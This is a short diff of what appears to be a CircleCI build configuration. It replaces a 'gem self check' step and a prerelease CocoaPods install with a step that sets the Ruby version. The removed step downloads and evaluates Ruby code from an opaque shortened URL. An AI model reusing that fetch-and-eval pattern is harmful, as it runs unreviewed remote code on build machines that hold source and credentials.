@@ -13,13 +13,10 @@ jobs:
     steps:
       - checkout
 
+      # Set Ruby version
       - run:
-          name: gem self check
-          command: ruby -ropen-uri -e 'eval open("https://git.io/vQhWq").read'
-          
-      - run:
-          name: something?
-          command: gem install cocoapods --pre
+          name: Set Ruby Version
+          command:  echo "ruby-2.4" > ~/.ruby-version
 
       # Install CocoaPods
       - run:
